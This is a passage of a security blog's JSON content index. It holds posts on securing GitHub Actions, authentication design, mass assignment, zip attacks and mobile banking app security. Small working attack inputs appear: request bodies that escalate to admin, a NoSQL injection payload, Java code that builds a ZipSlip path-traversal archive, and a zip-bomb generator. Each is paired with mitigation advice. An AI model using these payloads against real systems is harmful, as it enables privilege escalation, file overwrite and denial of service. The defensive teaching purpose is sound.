dump secrets for example, do the PR and it will run.\nIf you have linters or sast tools that you want to run before merging PR\u0026rsquo;s this can be problematic.\nThere are malicious users that do simple PR\u0026rsquo;s to fix typos or formatting issues on open source repos so that the owners of the repo approve them to run the workflow. After that he is free to run the workflows as he wants to.\nTo secure yourself from this, consider one of the options:\n Configure workflows to need manually approval for all runs (docs) Allow any user to run any action but the ones that need sensitive fields make them manually triggered, passing the sensitive information as param inputs. Configure environments  If you\u0026rsquo;re running workflows under an organization you have an org wide setting to disable workflows to run from pull requests from forked repos. This helps preventing repo specific secrets from getting leaked tby other organization members that do not have write permissions to the repository.\nTip: You can also disable forks from organization\u0026rsquo;s repositories.\nWorkflow with write permissions When running a workflow, github generates a temporary token (GITHUB_TOKEN) that lives only for the time of the running of the workflow. This token has by default read and write permissions to the repository and can be accessed by any action/step.\nSo, if you use random actions from the Github Marketplace the actions also have access to this token so be careful.\nYou should restrict the permissions of the GITHUB_TOKEN, in case you don\u0026rsquo;t need writing permissions. (docs)\nEnvironments Github environments can also contain secrets, and jobs that use environments need first to pass all protections to run. This means that environment secrets are only exposed after passing these protections.\nYou can require people to approve a workflow to run, and only make it run after X hours, which can add some time for relevant people see if something is wrong.\nAlso, you can restrict which branches can trigger the environment, so if you have a strict master branch protection, where it can only be merged by pull request (no direct pushes), and x reviewers, you can restrict an environment to run on master for example, which adds a good extra security.\nThird-Party Action abuse Good news. 3rd party actions cannot access your secrets variable\u0026hellip; But they can access the GITHUB_TOKEN.\nGood safety preventions for this are to set the GITHUB_TOKEN has as ready only and to specify which specific permissions the workflow will have when running.\nRemember that when you use 3rd party actions on most of the cases they will have access to you code as you probably did a checkout before, and even if you didn\u0026rsquo;t the action can do it with the GITHUB_TOKEN. If you have a private repo a malicious extension can easily exfiltrate your code.\nNowadays there\u0026rsquo;s a trendy term for this: Supply Chain Attack\nTo prevent malicious abuse of the 3rd party actions review the code of the action in the marketplace, and hardcode the hash of the commit reviewed, when using the action on your workflow.\nOtherwise an action author can release a new malicious update or delete a specific version and push the same version tag with different code. Using commit hashes prevents possible issues on your side.\nEx:\n1 2 3 4 5  ...steps:- name:\u0026#34;Checkout code\u0026#34;uses:actions/checkout@ec3a7ce113134d7a93b817d10a8272cb61118579# v2.4.0...  Also, github provides a configuration to specify which kind of actions can be run in an org/repo.\nYou can choose to disable Github Actions, to allow any action to run, local actions only (from the same org or the same repo) or even go into more detail and specify action names or even commit hashes\nPull Request Review Bypass Another interesting attack vector is by using the GITHUB_TOKEN to approve a PR. Since this token does not represent the user that trigger the event, using the token to approve a PR will just work.\nIf you only need 1 (more) approval to merge a PR, then you can easily do it with this flow. You can read more about this vulnerability in the eyes of the researchers who found it, here\nMeanwhile github added a new setting to help preventing this issue for organizations:\nThis setting is enabled by default in new repos, but repos created before the feature was introduced have it disabled.\nSome other recommendations online for this issue, is to increase the number of reviewers, but depending on your settings this may not be enough. For example if you don\u0026rsquo;t need a new approval after a code change, when you get number_of_required_approvals - 1 you can change the pull request and the action to approve it.\nSo for that recommendation to work, you need to enable the option \u0026ldquo;Dismiss stale pull request approvals when new commits are pushed\u0026rdquo; on the branch protection rules:\nAnd as a precaution add at least 3 reviewers instead of 2. So that you have at least two real reviewers.\nCustom Runners Workflows run in Runners. A runner is a container, and you can chose from a few different ones, being the most common ubuntu.\nA lot of organizations use custom runners, inside AWS for example, with privileged accesses to organization assets. This is done for example to do deployments.\nThe issue with this is as we saw before in Workflow Manipulation if somebody changes the action they have privilege access to everything the runner has as well.\nOn a private repo, as a rule of thumb do not use custom runners with more access then the users on that repo\nBilling Github actions are not free. For each different plan, github offers an amount of minutes and space for workflows. When that time or space comes to an end new costs are billed. This can be exploited to make workflows run for big amounts of time and a lot of times and eventually to increase the billing.\nCheck the storage and minutes for each plan here\nRequired status checks to pass Branch protections have an option to require status checks to pass before merging PR\u0026rsquo;s. This means that the workflows need to successfully pass first.\nRepository/Organization admins may rely on this feature to try to add some security, trying to force workflows to succeed on some checks, before merging. But this gives a false sense of security. As we saw before in Workflow Manipulation a developer can change the workflow to always pass, bypassing then this configuration.\nA workaround for this is to force multiple approvals (I recommend 2 if github actions cannot approve PR\u0026rsquo;s). This way, although the user changes the workflow to pass the checks, the reviewers of the pull request will see the change in the workflow and can reject the PR.\nKey Takeaways  Github actions are trending now, but do you really need a workflow? Is it the best option for you need? Secrets can be accessed by anybody with write access to a repo Secrets can be accessed by external repo users  By default, developers can run actions at will after first contribution, change the setting to always need manual approval (if you have secrets or privileged flows) Are you doing a deployment? Use a webhook instead to trigger a flow in a more restricted environment, or configure restricted github environments   Avoid organization\u0026rsquo;s wide secrets, anybody with permissions to create/write to a repo can extract them Avoid 3rd party action. You can enable options to only allow github\u0026rsquo;s, verified or internal actions to run. When using external actions review the source code first, and pin them to a specific commit hash to make sure there were no changes. Limit the workflow permissions Remove default GITHUB_TOKEN write permissions if not needed Block actions from approving pull requests on older repos Do not make available custom runners that have access to more things then the developers Change \u0026ldquo;Fork pull request workflows from outside collaborators\u0026rdquo; to \u0026ldquo;Require approval for all outside collaborators\u0026rdquo; for public or sensitive repos if you have configured secrets Do not rely on \u0026ldquo;Require status checks to pass before merging\u0026rdquo; if developers can change the actions Disable the permission for github actions to approve PR\u0026rsquo;s Use at least 2 reviewers for PR\u0026rsquo;s and block push to master  Other docs If you are writing github actions, i\u0026rsquo;ll leave here some documentation pages that were very helpful to me:\n Workflow Triggers - Events that can trigger a workflow Env Variables - Environment variables available when running bash Contexts - The context structure and all fields Expressions - Expressions to use in the yaml file like operators and functions Github Script - Run inline javascript code in the the yaml file Upload artifact - Action to upload artifacts generated in the workflow CodeQL Action - CodeQL Action and Sarif uploads  ", 
        "url": "https:\/\/thesecurityvault.com\/securing-github-actions\/",
        "summary": "Github actions are a thing more and more common nowadays, and I have to admit, I love them. But the security of Github Actions are usually ignored. In this post I\u0026rsquo;ll go through some of common flows and issues, and see some preventions\nTerminology First its important to understand the …",
        "preview": "https:\/\/thesecurityvault.com\/securing-github-actions\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/we-are-making-authentication-systems-wrong\/": {
        
        "title": "We are making authentication systems wrong",
        "tags": [],
        "content": "For a long time I\u0026rsquo;ve been struggling with the way authentication systems work, as they don\u0026rsquo;t protect your password as they should. If you search for login best practices, like in OWASP, they\u0026rsquo;ll tell you things like hashing the password with a strong algorithm, use salt and pepper, limit attempts, and the most important, use https.\nThe Issue Although all of this is true and should be done, all of this has a huge fail: Users need to trust their password to the server. In this common flow, the user needs to send the password to the server, and trust that the server will take good care of it. But saving it in the database its not all. In 2019 facebook found millions of passwords being written in plaintext to the logs for example. But even besides that, the server hashes and stores a protected version of the password in the DB, but what else can the server do with the unprotected version of the password?\nUsers tend to reuse passwords, and yes this is a (really) bad practice, but most of users still do it, either because its easy, or just because they have no idea how bad that can be. What if the server has bad intentions and uses your plaintext password and your supplied username/email to try to get access to other services that use the same credentials? But most important, passwords are private so why should we need to trust them to the servers we are authenticating to?\nSSO to the rescue? Using single sign-on systems can somehow reduce this risk, as you only need to trust your password to the SSO system, and all platforms that implement the SSO will never get your password. This works somehow but in a lot of the cases you still need to trust your password to the SSO server\nPassword-less Approaches There are password-less alternatives but they usually require you to have some kind of specific hardware, which most of the times needs to be acquired separately, so asking a user to buy a device to be able to login into your application is not reliable, although it works.\nThere are other approaches like emails with \u0026ldquo;magic-links\u0026rdquo; (for example slack), QR code scanning with a logged in app in the phone (web based whatsapp). Which work ok as well, but at least for me, these are more suitable for 2FA\u0026rsquo;s.\nOther alternatives There are a few ways to create a trustless system to deal with the authentication in a secure way, without receiving the user password. Lets see a few:\nECC This is the flow that I created for some of my cases\nElliptic curve cryptography. Asymmetric encryption is always a good solution as you have the private key in your side and a public key that can be stored in the server without need to worry. Unfortunately typing a private key on a website to login is not practical at all. That\u0026rsquo;s where ecc comes into play.\nYou can create a private key from basically any 32 byte sequence, and from there derive a public key. This can make our asymmetric approach feasible.\nThe next image demonstrates the flow needed to implement this solution\nIn this solution as you can see, we create a private key based on the user password. At signup the public key is sent to the server and the server generates a secure salt for the PBKDF2 function.\nSo every time the user wants to login the password is used to recalculate the private key based on the user password, and that private key is used to sign a unique challenge securely generated on the server. The user never sends his password to the server, and the server only stores a public key, which as the name suggests, is public.\nIf you want to go the extra mile you can also generate a nonce in the frontend, and mix it in the signing method like Sig = Sign(Challenge+Nonce, PrivKey). Both the Nonce and the Sig need be sent to the server. This way the user can enforce that a really random value is added (not trusting the Challenge).\nDouble Hashing Another solution is to double hash the password, once in the frontend and once in the backend. This way, when the password gets to the server is already an \u0026ldquo;unreversible\u0026rdquo; hash. We need to hash it again because if the hashes from the database are dumped an attacker just needs to send the hash as is to be able to login (would be like if it was as plaintext). Hashing again in the backend invalidates this vector.\nGoing with this approach needs to create two salts, one for each hashing.\nSecure Remote Password (SRP) SRP is a really interesting proposal already being deployed by big players, which consists on generating and sending to the server a verifier with which the server can check that the user knows the actual password, without sending it. On top of that is possible to derive a shared secret key on both sides, without ever sending it over the network, just like Diffie Helmen. This implementation\u0026rsquo;s docs do a great job explaining the logic\n", 
        "url": "https:\/\/thesecurityvault.com\/we-are-making-authentication-systems-wrong\/",
        "summary": "For a long time I\u0026rsquo;ve been struggling with the way authentication systems work, as they don\u0026rsquo;t protect your password as they should. If you search for login best practices, like in OWASP, they\u0026rsquo;ll tell you things like hashing the password with a strong algorithm, use salt and pepper, …",
        "preview": "https:\/\/thesecurityvault.com\/we-are-making-authentication-systems-wrong\//images\/banner.jpeg"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/what-is-and-how-to-prevent-mass-assignment-vulnerabilities\/": {
        
        "title": "What is and how to prevent Mass Assignment Vulnerabilities",
        "tags": [],
        "content": "First time I heard about mass assignment vulnerabilities was a long time ago, when I started learning Ruby \u0026amp; Rails. In fact I learnt a lot, security related back then, as Rails is a quite complex and secure framework, and to properly work with it you should understand the underlying mechanisms.\nAt that time Rails had just introduced a security feature called \u0026ldquo;Strong Parameters\u0026rdquo; to help protect against mass assignment attacks and I was curious about what it was for so I spent some time going through the docs.\nMass Assignment Vulnerabilities Explained The concept referes to when you inject a set of values directly into an object, thus the name mass assignment, which without proper validation can cause serious problems to the application logic.\nLets see a Java example with Spring:\n1 2 3 4  @RequestMapping(value = \u0026#34;/users\u0026#34;, method = RequestMethod.POST) public void create(User user) { userService.add(user); }   What can go wrong with the snippet above? If the User object has fields like \u0026ldquo;isAdmin\u0026rdquo; an attacker can easily create an admin user because the endpoint blindly accepts all fields from the User class.\nA more complex example Mass assignment is basically this, but you can have some complex and interesting attack vectors, so lets see another case, this time in Node:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  ... app.post(\u0026#34;/posts\u0026#34;, async (req: Request, res: Response) =\u0026gt; { const p: Post = req.body; const post = await Post.create(p).save(); res.send(post); }); ... @Entity(\u0026#34;posts\u0026#34;) export class Post extends BaseEntity { ... @ManyToOne(type =\u0026gt; Author, author =\u0026gt; author.posts, { cascade: true }) @JoinColumn({ name: \u0026#34;author_id\u0026#34; }) author?: Author; } @Entity(\u0026#34;authors\u0026#34;) export class Author extends BaseEntity { ... @Column({ name: \u0026#34;is_admin\u0026#34; }) isAdmin?: number; @OneToMany(type =\u0026gt; Post, post =\u0026gt; post.author) posts?: Post[]; }   This example uses Express and TypeORM with the ActiveRecord pattern.\nThe endpoint receives a \u0026ldquo;Post\u0026rdquo; object in the request\u0026rsquo;s body and blindly creates a post in the database with the data received.\nIn this case, an attacker can send in the payload a user object, as its part of the Post structure, and this user will get created at the same time than the post. Again, you have the isAdmin field that can be used to create a privileged account, but this time from a Post. Neat.\nThis is the request content that can trigger this flow:\n1  {\u0026#34;title\u0026#34;: \u0026#34;Some Post\u0026#34;, \u0026#34;author\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;Me\u0026#34;, \u0026#34;isAdmin\u0026#34;: true, ...}, ...}   Careful with NoSQL Databases You can also have Mass Assignment vulnerabilities with NoSQL databases that can cause NoSQL Injection\nLet\u0026rsquo;s take into consideration MongoDB. MongoDB works with unstructured documents, so 10 user objects can have completely different fields in the database and an attacker can take advantage of this\nBut most important: NoSQL Injection attacks. Mongo query language (MQL) resembles javascript objects so if you use user input to do a query a lot of things can go wrong.\nImagine you have a line like:\n1 2 3 4  app.post(\u0026#34;/search\u0026#34;, async (req: Request, res: Response) =\u0026gt; { const users = await User.find(req.body.name) res.send(users); });   And this is how an attacker could exploit this:\n1  {\u0026#34;name\u0026#34;: {\u0026#34;$ne\u0026#34;: \u0026#34;-\u0026#34;}}   Notice that instead of a string, an object was sent, that will be injected in the find query, searching for all users where name is not equal to \u0026ldquo;-\u0026rdquo;.\nPrevention Now that we have a fair understanding of what\u0026rsquo;s Mass Assignment lets move to how to prevent/fix it.\nThe first tip for that, and should be a rule of thumb for every project is: Know the technologies you\u0026rsquo;re using. This is actually really important, not only for Mass Assignment but for everything\u0026hellip; In the second example above, the attack to create a new user was only possible because the cascade property (in the many to one reference) was set to true, otherwise TypeORM wouldn\u0026rsquo;t do it by default. Mass Assignment would still be possible for the Post object.\nAnother example: Rails implements \u0026ldquo;Strong Parameters\u0026rdquo; so if you want to mass assign something you need to explicitly whitelist the parameters that you want to allow for Mass Assignment, but thats for models that inherit from ActiveRecord, so this isn\u0026rsquo;t a \u0026ldquo;global\u0026rdquo; protection although it should work for most of cases.\nKnowing the frameworks/libs you\u0026rsquo;re working with can help a lot. I usually start by spending some good time reading security and/or best practices from the official docs of the technologies I\u0026rsquo;m using.\nData Transfer Objects Also known as DTOs, the idea behind this approach is that you create objects specifically to be in transit, and most important, with user supplied data. So you only have the fields needed for the required operations.\nTo fix the first snippet you could create a CreateUserDTO class that didn\u0026rsquo;t have the isAdmin field. Then there\u0026rsquo;s a routine that converts that into a User object (being the default isAdmin option false). You can create other DTOs for sending users that have the isAdmin field if needed.\nThis is a common practice, but personally I don\u0026rsquo;t like it as adds a lot of overhead, multiple DTOs, the conversions, etc. Personally I like to have simple code so this is not a best fit for me.\nFilter Fields This is usually my go to. Specify which fields can be sent (whitelisting, never blacklisting), and change them for specific operations if needed. Again, this is the logic of Rails' strong parameters. If you\u0026rsquo;re using an ORM also remember to check the type of a field, because if you get an object where you were expecting a string, the ORM may resolve that and save the foreign object as well. I\u0026rsquo;ve seen a lot of \u0026ldquo;fixes\u0026rdquo; online to use for example underscore\u0026rsquo;s pick method, but if you allow a user field, and the user field is an object, you still have a problem there. So be careful on how you implement this.\nYou can easily create a method to filter the fields that you want to accept, like this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  export const filter = (object: any, fields: any) =\u0026gt; { const cleanObject: any = {} Object.keys(fields).forEach(k =\u0026gt; { const fieldType = fields[k] if (typeof fieldType === \u0026#34;object\u0026#34;) cleanObject[k] = filter(object[k], fieldType) else if (typeof object[k] === fieldType) cleanObject[k] = object[k] }) return cleanObject } const userSuppliedObject = { group: { name: \u0026#34;My Group\u0026#34;, public: true, owner: { username: \u0026#34;NEW USER\u0026#34;, isAdmin: true } } } const allowedFields = { group: { name: \u0026#34;string\u0026#34;, owner: { username: \u0026#34;string\u0026#34; } } }; const cleanObject = filter(userSuppliedObject, allowedFields)   ", 
        "url": "https:\/\/thesecurityvault.com\/what-is-and-how-to-prevent-mass-assignment-vulnerabilities\/",
        "summary": "First time I heard about mass assignment vulnerabilities was a long time ago, when I started learning Ruby \u0026amp; Rails. In fact I learnt a lot, security related back then, as Rails is a quite complex and secure framework, and to properly work with it you should understand the underlying mechanisms. …",
        "preview": "https:\/\/thesecurityvault.com\/what-is-and-how-to-prevent-mass-assignment-vulnerabilities\//images\/banner.jpeg"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/attacks-with-zip-files-and-mitigations\/": {
        
        "title": "Attacks with Zip Files and Mitigations",
        "tags": [],
        "content": "Once again, I bring a topic that I don\u0026rsquo;t see getting enough attention , and a lot of times this ends up being a big security issue in the targeted systems\u0026hellip; Attacks with zip files, two different and interesting attacks.\nZipSlip Zip Slip is a vulnerability discovered by Snyk and its a really simple concept. It allows to do some kind of path traversal when unzipping files. This happens because the zip specification allows to create file names like:\n1  ../../../../../../../../my_file   When extracting files, the file name is usually used (commonly with a prefixed path) in a file write method, to give the name to the extracted file\u0026hellip; But since the path name contains all those \u0026lsquo;../\u0026rsquo; you are in fact setting the file path somewhere else.\nCreating the malicious Zip Files As far as I know, you can\u0026rsquo;t use regular zipping utilities to create the malicious zip files as none support it. But you can do a bit of code, and easily achieve the final result.\nThe following code is a simple java function that zips a file called zip_me.txt and stores it in the zip as \u0026ldquo;../malicious_entry.txt\u0026rdquo;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  public static void zip() throws FileNotFoundException, IOException{ String sourceFile = \u0026#34;test/archive/zip_me.txt\u0026#34;; FileOutputStream fos = new FileOutputStream(fileZip); ZipOutputStream zipOut = new ZipOutputStream(fos); File fileToZip = new File(sourceFile); FileInputStream fis = new FileInputStream(fileToZip); ZipEntry zipEntry = new ZipEntry(\u0026#34;../malicious_entry.txt\u0026#34;); zipOut.putNextEntry(zipEntry); byte[] bytes = new byte[1024]; int length; while((length = fis.read(bytes)) \u0026gt;= 0) { zipOut.write(bytes, 0, length); } zipOut.close(); fis.close(); fos.close(); }   Impact Now that we understand how these attacks with zip files work whats the impact that this can have? Well, basically the same as path traversal\u0026hellip; You can for example write a file in the application root folder that can give you a remove shell to the server. So this can be high severity.\nPrevention Note that not all libraries/tools will be affected by this attack, for example The Unarchiver ignores the file, default ruby zip library ignores the file path with a warning like: \u0026ldquo;WARNING: skipped \u0026ldquo;../\u0026rdquo; path component(s) in ../malicious_entry.txt\u0026rdquo;\nSo the question is: \u0026ldquo;Shouldn\u0026rsquo;t all libraries prevent this attack?\u0026rdquo;. And the answer is no. As said above, the zip specification allows these filenames, so a library at a low level should also allow. Now, if you are using a high level library to help you zip/unzip files that library needs to prevent this.\nSnyk also keeps a list of libraries which are affected or not by ZipSlip here but I would say that its better to test it as for example, if a library doesn\u0026rsquo;t provide a high level API its not the library responsibility to \u0026ldquo;prevent\u0026rdquo; the attack but some do, like the ruby\u0026rsquo;s rubyzip\nFrom the code side, the safest way is to resolve the canonical path of each file before writing it and make sure it is inside the directory you intended it to be:\n1 2 3 4 5 6  String canonicalDestinationDirPath = destinationDir.getCanonicalPath(); File destinationfile = new File(destinationDir, e.getName()); String canonicalDestinationFile = destinationfile.getCanonicalPath(); if (!canonicalDestinationFile.startsWith(canonicalDestinationDirPath + File.separator)) { throw new ArchiverException(\u0026#34;Entry is outside of the target dir: \u0026#34; + e.getName()); }   Zip Bomb Some other interesting attacks with zip files are zip bombs.\nA zip bomb is a zip file that after uncompressed increases significantly its size, this is due to the way zip compression works, by keeping track of repeating patterns, and replacing it by a smaller representation. So what appears to be a small zip file can end up being a huge file.\nBomb Impact A zip bomb can be used for example to DoS a system. Imagine that an application does heavy operations in a zip file, lets say it extracts all files and searches for specific strings in it. The file ZIP was limited to 50MB so that it doesn\u0026rsquo;t take to much system resources. The unzipped file can be 5GB, and searching for a string in a 5GB file is significantly slower, and do not forget of the fact that you will probably unzip and store the unzipped file in disk, which also takes some time.\nCreating a zip bomb Ok, so how to create a zip bomb?\nWe just need to create a huge file with a repeating pattern:\n1 2 3 4 5  File.open(\u0026#34;test.txt\u0026#34;,\u0026#34;w\u0026#34;) do |line| (1...99999999).each do |i| line.print \u0026#34;000000000000000000000000000000000000000000000000000000000000\u0026#34; end end   The code above generates a text file with zeros, that has about 6GB.\nAfter compressing that generated file you end up with an archived file with around 6MB. Huge difference right?\nThis is awesome to bypass upload size limits for example.\nBomb Prevention Its quite easy to prevent a zip bomb from exploding\u0026hellip; All you need to do is check the file\u0026rsquo;s original size before writing it to disk. Set a limit to the uncompressed file sizes, or a deviation between the compressed and uncompressed sizes.\nIn the following java example its assumed that the zip file contains source code files, so a validation exists that no file can be bigger then 10MB. Depending on your requirements this might not be the best solution.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  public static void unzip() throws FileNotFoundException, IOException{ byte[] buffer = new byte[1024]; ZipFile zipfile = new ZipFile(\u0026#34;zipbomb.zip\u0026#34;); Enumeration zipEnum = zipfile.entries(); while (zipEnum.hasMoreElements ()) { ZipEntry zipEntry = (ZipEntry) zipEnum.nextElement(); File newFile = new File(zipEntry.getName()); if (zipEntry.isDirectory()) newFile.mkdirs(); else if(zipEntry.getSize() \u0026lt; (10 * 1024 * 1024)) { //\u0026lt;10MB  FileOutputStream fos = new FileOutputStream(newFile); int len; InputStream is = zipfile.getInputStream(zipEntry); while ((len = is.read(buffer)) \u0026gt; 0) fos.write(buffer, 0, len); fos.close(); } else System.out.println(\u0026#34;File to big to extract\u0026#34;); } zipfile.close(); }   New Zip Bomb attack The method described above is quite old, and even if 5MB going to 5GB seems quite interesting in 2019 a much better technique was found. In the link you can find the presentation about the finding, where its described in detail this new attack.\nI will not get into the technical details, but you can use the tool provided by the researcher to generate a much more \u0026ldquo;productive\u0026rdquo; zip file, where a 40kb zipped file can be uncompressed into more then 5GB.\nI tested this with a few different tools/libraries and they seem to be patched against it. The Unarchiver isn\u0026rsquo;t vulnerable to this attack either. But again, nothing better then testing it in your environment.\nNot only for Zip Extensions These attacks can also be exploited in other file types like .apk, docx, .jar as they are in fact a zipped directory. So be careful with any zip based extension and always make sure the code you\u0026rsquo;re using isn\u0026rsquo;t vulnerable\n", 
        "url": "https:\/\/thesecurityvault.com\/attacks-with-zip-files-and-mitigations\/",
        "summary": "Once again, I bring a topic that I don\u0026rsquo;t see getting enough attention , and a lot of times this ends up being a big security issue in the targeted systems\u0026hellip; Attacks with zip files, two different and interesting attacks.\nZipSlip Zip Slip is a vulnerability discovered by Snyk and its a …",
        "preview": "https:\/\/thesecurityvault.com\/attacks-with-zip-files-and-mitigations\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/are-your-mobile-banking-apps-secure\/": {
        
        "title": "Are your mobile banking apps secure?",
        "tags": [],
        "content": "These past few days I\u0026rsquo;ve been doing some security checks in my mobile banking apps as I basically never did it since opening the accounts a lot of years ago. I was quite surprised with the difference of security among my bank applications, and it even motivated me to close one of the accounts.\nIn this article I\u0026rsquo;m going to compare some of the security features between two of my banks' mobile applications, from the user perspective, without going into the underlying details of the coding implementation.\nI hope to share some light about things you should have (or not), security wise, with your banking apps\nTo differentiate between between the two apps, I\u0026rsquo;ll refer to them as the \u0026ldquo;Safer App\u0026rdquo; and the \u0026ldquo;Not so Secure App\u0026rdquo;. I will not mention the bank names.\nInitial Login The Safer App require you to go to an ATM requesting a new login. This option generate a username automatically and require you to define a 7 digit code. The username can only be used to register one device and the 7 digit code is bound to that user only. After that you need to request new login to register other devices. When logging in in the app you need to introduce the generated username and 3 of the 7 digits code. A particularly interesting feature is that all operations that ask you for 3 digits will always ask for the 3 same digits, until you correctly provide them. So if you cancel the operation and try again, will ask the same 3 digits. This is good, in case an attacker finds 3 of those digits and tries to get the app to request those specific 3.\nThe Not so Secure app after enabling mobile app access with the bank asks you 3 digits from 1 of the two: SSN or personal id number. This is public information so not a good start. In the same way the app requires you 3 digits from a 7 digit defined code. And oposite to the Safer app, if you cancel the operation and open again it will ask you for a new code.\nBoth apps support to use FaceID with my iPhone although personally I don\u0026rsquo;t recommend enabling this feature, as you can sometimes allow other people to unlock the phone.\nApplication Access Both applications require you to set a 4 digit pin to access the app. The option to go with a 4 digit here is nice because if forces the user to create a different code then the 7 digit code. Unfortunately 4 digit pins are used for a lot of different things, so users will probably reuse them. A better approach would be to force a password, or create a code with different size and check that it doesn\u0026rsquo;t contain a sequence from the 7 digit code.\nObviously for an attacker to use the app still needs access to the phone\u0026hellip; And a 4 digit it\u0026rsquo;s better than nothing, but if the attacker knows the person\u0026hellip; it can easily enter the bank app. Also 4 digit codes tend to be important years (like birth) or special dates (month/day, day/month). Also none of the applications forced the user to have a passcode to lock the cellphone.\nIt should be a best practice for apps that deal with sensitive data, to force or at least advise the users to create a lock passcode for their phones in case somebody steals it.\nAlso, the Safer app, every time its backgrounded requires the 4 digit code to login again. The same doesn\u0026rsquo;t happen with the not so secure app, which I believe that needs to be in background for more than X seconds/minutes before requesting the code again. So if I give my phone to somebody after opening the banking app, that person can easily access my banking app without any verification.\nOperations' Authorization This is probably the most important part\u0026hellip; What do you need to do an operation in the application?\nThe Matrix Card A few years ago there was a common practice of creating a matrix card, which consisted on a big table with tons of codes. Then an app would ask you for a code at for example C5 and the user would use this coordinates to get a code in the matrix card to insert in the app.\nAlthough this seems a good and secure idea, the fact is that the security of your operations are as secure as the card, and this card in most cases was on users' wallets. If that wallet gets stollen an attacker could ask your bank through telephone to do a transfer for example. Also the codes in the matrix card couldn\u0026rsquo;t be changed, so do you trust in everybody involved in the process of sending it to you?\nAlthough this practice is still used, its not that common anymore.\n7 digits pin code Banking apps started to use for example a 7 digit code, where it asks 3 digits from it. Obviously guessing 3 digits isn\u0026rsquo;t hard as you only have 1000 possible combinations. So is it worth it?\nWell yes, if you have a small number of attemps. Like 3 consecutive failures the app blocks.\nThis is what happens with the Safer App. And I\u0026rsquo;ve been there\u0026hellip; By mistake I got my app blocked. And the reaction from the bank was awesome. I got an SMS and email right after it, and a guy from the bank called me in less than 5 minutes notifying me of a possible security breach in my account and that my account\u0026rsquo;s online operations were temporarily locked until verification. I had to confirm it was me, so he could unlock the account. but I still had to go to an ATM and request a new access. Awesome.\nAlso, if you are doing large transfers or other actions considered high risk (not sure what constitutes that) an SMS with a code is also sent to the phone to confirm and an email notification is sent after the operation. Although an SMS can work nice in the web app when you\u0026rsquo;re at the computer, confirming an action done on the telephone with an SMS to that phone its not that good, but\u0026hellip;\nThe not so secure app, asks for confirmation for every operation but the confirmation is just an SMS. And I don\u0026rsquo;t want to get into the details of SMS security, but if you have a mobile app, and you ask for confirmation only with an SMS, what good is that for if you are going to receive the SMS on the same device?\nThis SMS verifications can help if an attacker is trying to remotely hack you account, but it doesn\u0026rsquo;t help at all for \u0026ldquo;local\u0026rdquo; security.\nI never tried to fail this confirmation to see what happens, but I\u0026rsquo;m somehow convinced that nothing would happen. (Added to my todo list)\nNotifications Let\u0026rsquo;s start by the not so secure app this time. Because of the issues with the SMS validation described above I tried to enable notifications for basically all operations that were done with the account, so that at least I could track if something bad happened.\nNo notifications were available at the app (only for bank news)\u0026hellip; So, not happy with that I called the bank support and asked if I could get notified of any operation that happens in my account. Thats definitely a question they don\u0026rsquo;t get a lot, I was on hold for an answer for almost 10 minutes. At the end and after saying that it wasn\u0026rsquo;t possible the call finished with something like: \u0026ldquo;Its definitely a good idea and we will take this into consideration for improving our security\u0026rdquo;.\nOn the bright side the safer app has notifications for all operations, and you can enable push notifications or receive emails for transfers sent/received, direct debits, logins, etc. Now, every time I use apple pay on my phone I get instantly a notification from my bank\u0026rsquo;s app that a payment was done. Awesome again.\nPrivacy I have to say that this wasn\u0026rsquo;t something I dug to much but there are two things that I want to mention.\nFirst is screen caching, that I already covered here.\nEvery time I send the Safer app to the background, all data is hidden by the bank\u0026rsquo;s logo, so it can\u0026rsquo;t be seen in the app switcher. On the other hand, the not so secure app does nothing, so somebody using my phone could see my banking balance without having access to the app.\nThe second thing regarding privacy I have to admit that I never saw this in any other of my apps (but seems to be common), and although I never had a real case to use it, I love it. This is a feature present in the safer app and its called \u0026ldquo;Privacy Mode\u0026rdquo;.\nBasically at login, I can enable the privacy mode, that will just hide my balance and any transaction value so that it is \u0026ldquo;safe\u0026rdquo; to open the app with people around. This is awesome to protect me shoulder surfing.\nCard Security The safer app allows me to configure if I want my card to be able to be used in online payments, outside my country, to disable contactless or temporarily disable the card. It is still missing a nice feature of disabling ATM withdraws.\nOn the other side, the not so secure app doesn\u0026rsquo;t offer any of these features.\nCustom Keyboards For this section I have to admit that I didn\u0026rsquo;t test it in my apps\u0026hellip;\nBut its a good practice for applications that deal with sensitive information to disallow the use of custom keyboards on sensitive fields as they can collect typed data and send it to a server. This happens a lot, specially with keyboards that adapt/learn to know what you are going to type next to give you suggestions.\nIt is also common to see a custom keyboard, implemented by the app, for the initial 4 digit pin for the same reason, although other inputs are usually forgotten.\nSo how are you mobile banking apps security? Are they careful with the details? Or is it time to switch banks?\n", 
        "url": "https:\/\/thesecurityvault.com\/are-your-mobile-banking-apps-secure\/",
        "summary": "These past few days I\u0026rsquo;ve been doing some security checks in my mobile banking apps as I basically never did it since opening the accounts a lot of years ago. I was quite surprised with the difference of security among my bank applications, and it even motivated me to close one of the accounts. …",
        "preview": "https:\/\/thesecurityvault.com\/are-your-mobile-banking-apps-secure\//images\/banner.png"
    },
    
    
    
    "https:\/\/thesecurityvault.com\/the-log-forging-vulnerability-and-how-to-fix-it\/": {
        
        "title": "The Log Forging Vulnerability And How To Fix It",
        "tags": [],
